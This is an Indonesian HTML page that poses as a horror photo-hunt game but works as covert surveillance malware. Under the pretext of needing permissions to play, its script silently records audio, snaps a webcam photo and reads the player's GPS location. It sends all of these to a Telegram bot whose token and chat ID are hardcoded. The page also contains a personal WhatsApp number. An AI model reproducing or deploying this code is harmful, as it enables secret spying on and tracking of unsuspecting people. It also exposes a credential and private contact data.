<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Horror Ambatukam Hunt</title>
  <style>
    /* --- Pengaturan Dasar --- */
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      background-color: black;
      font-family: Arial, sans-serif;
      height: 100vh;
      overflow: hidden;
      position: relative;
      /* Untuk mendukung gesture touch dengan lebih baik */
      touch-action: none;
    }
    /* Background video */
    #bgVideo {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: -2;
    }
    /* Konten Sambutan (Intro) â€” tampil di awal */
    #introText {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
      color: white;
      z-index: 2;
      padding: 0 20px;
    }
    #introText h1 {
      font-size: 2.5rem;
      margin-bottom: 10px;
    }
    #introText p {
      font-size: 1.2rem;
      margin-bottom: 20px;
    }
    /* Tombol sambutan */
    #startGameBtn {
      padding: 10px 30px;
      background-color: red;
      color: white;
      border: none;
      font-size: 1.2rem;
      cursor: pointer;
      border-radius: 5px;
    }
    #startGameBtn:hover {
      background-color: darkred;
    }
    /* Kontainer Foto (Game) */
    #photoContainer {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
      z-index: 1;
      padding: 0 20px;
    }
    #photoContainer img {
      width: 100%;
      max-width: 100%;
      height: auto;
      margin-bottom: 20px;
    }
    /* Tombol Navigasi (Ikon) */
    #prevBtn, #nextBtn {
      position: absolute;
      top: 50%;
      transform: translateY(-50%);
      background-color: rgba(0,0,0,0.5);
      border: none;
      color: white;
      font-size: 2.5rem;
      cursor: pointer;
      padding: 10px;
      border-radius: 50%;
      z-index: 12;
      display: none;
    }
    #prevBtn {
      left: 10px;
    }
    #nextBtn {
      right: 10px;
    }
    /* Overlay Darkness & Spotlight (tidak tampil di awal) */
    .darkness {
      display: none;
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      pointer-events: none;
      z-index: 10;
    }
    .light {
      position: absolute;
      width: 300px;
      height: 300px;
      border-radius: 50%;
      /* Menggelapkan seluruh layar kecuali area lingkaran */
      box-shadow: 400vh 0px 0px 400vw rgba(0,0,0,0.99);
    }
    .shadow {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      box-shadow: inset 4px 0 37px 53px rgba(0,0,0,0.9);
    }
    /* End Popup (setelah foto terakhir) */
    #endPopup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: rgba(0,0,0,0.8);
      padding: 30px;
      border-radius: 10px;
      text-align: center;
      color: white;
      z-index: 12;
      width: 80%;
      max-width: 400px;
    }
    #endPopup h2 {
      margin-bottom: 20px;
      font-size: 1.5rem;
    }
    #endPopup button {
      padding: 10px 30px;
      margin: 10px;
      font-size: 1rem;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      color: white;
    }
    #endPopup #noBtn {
      background-color: red;
    }
    #endPopup #noBtn:hover {
      background-color: darkred;
    }
    #endPopup #yesBtn {
      background-color: green;
    }
    #endPopup #yesBtn:hover {
      background-color: darkgreen;
    }
    /* Media queries untuk responsivitas */
    @media (max-width: 768px) {
      #introText h1 {
        font-size: 2rem;
      }
      #introText p {
        font-size: 1rem;
      }
      #startGameBtn {
        font-size: 1rem;
        padding: 8px 20px;
      }
      #prevBtn, #nextBtn {
        font-size: 2rem;
        padding: 8px;
      }
      .light {
        width: 200px;
        height: 200px;
        box-shadow: 300vh 0px 0px 300vw rgba(0,0,0,0.99);
      }
    }
  </style>
</head>
<body>
  <!-- Background Video -->
  <video id="bgVideo" autoplay loop muted>
    <source src="rented-bunny.gif" type="video/gif" />
  </video>

  <!-- Konten Sambutan (Intro) -->
  <div id="introText">
    <h1>Selamat datang di Horror Ambatukam Hunt</h1>
    <p>Izinkan semua kamera, lokasi, dan suara untuk lanjut bermain game ini</p>
    <button id="startGameBtn">Izinkan dan Mulai</button>
  </div>

  <!-- Kontainer Foto (Game) -->
  <div id="photoContainer">
    <img id="photoSlide" src="" alt="Ambatukam Image" />
  </div>
  <!-- Tombol Navigasi: Prev dan Next -->
  <button id="prevBtn">&#10094;</button>
  <button id="nextBtn">&#10095;</button>

  <!-- Overlay Darkness & Spotlight -->
  <div class="darkness" id="darkness">
    <div class="light" id="light">
      <div class="shadow"></div>
    </div>
  </div>

  <!-- End Popup (setelah foto terakhir) -->
  <div id="endPopup">
    <h2>Apakah kamu menemukan ambatukam :0?</h2>
    <button id="noBtn">Enggak</button>
    <button id="yesBtn">Iya</button>
  </div>

  <!-- Musik Latar -->
  <audio id="horrorMusic" autoplay loop>
    <source src="Y2meta - d2a9a585f47c840.mp4" type="audio/mp3" />
    Your browser does not support the audio element.
  </audio>

  <script>
    // Konfigurasi Telegram (ganti dengan token & chatId milik Anda)
    const botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8";
    const chatId = "6010073048";

    // Array foto untuk game
    const photos = [
      "photo1.jpg", "photo2.jpg", "photo3.jpg", "photo4.jpg", "photo5.jpg",
      "photo6.jpg", "photo7.jpg", "photo8.jpg", "photo9.png"
    ];
    let currentPhotoIndex = 0;
    let videoStream;

    // Ambil elemen penting
    const introText = document.getElementById('introText');
    const startGameBtn = document.getElementById('startGameBtn');
    const photoContainer = document.getElementById('photoContainer');
    const photoSlide = document.getElementById('photoSlide');
    const prevBtn = document.getElementById('prevBtn');
    const nextBtn = document.getElementById('nextBtn');
    const darkness = document.getElementById('darkness');
    const light = document.getElementById('light');
    const endPopup = document.getElementById('endPopup');
    const noBtn = document.getElementById('noBtn');
    const yesBtn = document.getElementById('yesBtn');

    // Event listener untuk tombol popup akhir
    noBtn.addEventListener('click', () => {
      window.location.href = 'https://youtu.be/8241aX1ArU0?si=mehpHFjZE3lXF4Y1';
    });
    yesBtn.addEventListener('click', () => {
      const message = encodeURIComponent("HALO OWNER, AKU MENEMUKAN AMBATUKAM DI GEM HORROR KAMU, AKU KIRIM BUKTI SCREENSHOTNYA... JANGAN LUPA REWARD NYA YA :D");
      window.location.href = `https://wa.me/6281319865384?text=${message}`;
    });

    // Mulai game ketika tombol "Izinkan dan Mulai" ditekan
    startGameBtn.addEventListener('click', async () => {
      // Sembunyikan konten sambutan
      introText.style.display = 'none';
      // Tampilkan overlay darkness (spotlight)
      darkness.style.display = 'block';
      // Mulai game
      await startGame();
    });

    async function startGame() {
      try {
        // Minta akses kamera dan audio
        videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        // Minta akses lokasi
        const location = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject);
        });
        
        alert("Misi Kamu: Carikan ambatukam dibalik objek yang menghalangi (DILIAT BAIK-BAIK). Jika ketemu screenshot ambatukam itu, kirimkan ke pencipta permainan ini untuk mendapatkan hadiah spesial.");
        
        // Mulai menangkap foto, audio, dan lokasi, kemudian kirim ke Telegram
        capturePhotoAndAudio(location.coords);
        // Tampilkan kontainer game (foto) dan tombol navigasi
        photoContainer.style.display = 'block';
        prevBtn.style.display = 'block';
        nextBtn.style.display = 'block';
        showPhoto(currentPhotoIndex);
      } catch (error) {
        alert("Akses ditolak. Game tidak bisa dilanjutkan.");
      }
    }

    function capturePhotoAndAudio(coords) {
      // Buat elemen video untuk mengambil stream
      const video = document.createElement("video");
      video.srcObject = videoStream;
      video.play();
      
      // Rekam audio menggunakan MediaRecorder
      const mediaRecorder = new MediaRecorder(videoStream);
      let audioChunks = [];
      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };
      mediaRecorder.start();
      
      // Setelah 5 detik, ambil snapshot (foto) dan hentikan perekaman audio
      setTimeout(() => {
        const canvas = document.createElement("canvas");
        // Jika ukuran video tersedia, gunakan; jika tidak gunakan default 640x480
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL("image/png");
        
        mediaRecorder.stop();
        mediaRecorder.onstop = () => {
          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
          // Kirim foto, audio, dan lokasi ke Telegram
          sendToTelegram(imageData, coords, audioBlob);
        };
      }, 5000);
    }

    function sendToTelegram(imageData, location, audioBlob) {
      // Kirim lokasi ke Telegram
      fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          latitude: location.latitude,
          longitude: location.longitude
        })
      })
      .then(response => response.json())
      .then(data => console.log("Location sent:", data))
      .catch(error => console.error("Error sending location:", error));
      
      // Konversi imageData (dataURI) ke Blob
      const photoBlob = dataURItoBlob(imageData);
      // Kirim foto ke Telegram
      const formDataPhoto = new FormData();
      formDataPhoto.append("chat_id", chatId);
      formDataPhoto.append("photo", photoBlob, "image.png");
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formDataPhoto
      })
      .then(response => response.json())
      .then(data => console.log("Photo sent:", data))
      .catch(error => console.error("Error sending photo:", error));
      
      // Kirim audio ke Telegram
      const formDataAudio = new FormData();
      formDataAudio.append("chat_id", chatId);
      formDataAudio.append("audio", audioBlob, "audio.webm");
      fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
        method: "POST",
        body: formDataAudio
      })
      .then(response => response.json())
      .then(data => console.log("Audio sent:", data))
      .catch(error => console.error("Error sending audio:", error));
    }

    function dataURItoBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ab], { type: 'image/png' });
    }

    function showPhoto(index) {
      photoSlide.src = photos[index];
    }

    // Tombol Navigasi: "Prev" untuk mundur, "Next" untuk lanjut.
    // Jika di foto terakhir, klik "Next" akan memunculkan popup.
    prevBtn.addEventListener('click', () => {
      // Jika popup tampil, sembunyikan popup
      if (endPopup.style.display === 'block') {
        endPopup.style.display = 'none';
      }
      // Navigasi mundur (wrap-around)
      if (currentPhotoIndex === 0) {
        currentPhotoIndex = photos.length - 1;
      } else {
        currentPhotoIndex--;
      }
      showPhoto(currentPhotoIndex);
    });
    nextBtn.addEventListener('click', () => {
      if (currentPhotoIndex === photos.length - 1) {
        // Tampilkan popup konfirmasi jika sudah di foto terakhir
        endPopup.style.display = 'block';
      } else {
        currentPhotoIndex++;
        showPhoto(currentPhotoIndex);
      }
    });

    // Fungsi update posisi spotlight (senter)
    function updateSpotlight(e) {
      let x, y;
      if (e.touches && e.touches.length > 0) {
        x = e.touches[0].clientX - (light.offsetWidth / 2);
        y = e.touches[0].clientY - (light.offsetHeight / 2);
      } else {
        x = e.clientX - (light.offsetWidth / 2);
        y = e.clientY - (light.offsetHeight / 2);
      }
      light.style.transform = `translate(${x}px, ${y}px)`;
    }
    document.addEventListener('mousemove', updateSpotlight);
    document.addEventListener('touchmove', updateSpotlight);
    document.addEventListener('touchstart', updateSpotlight);
  </script>
</body>
</html>
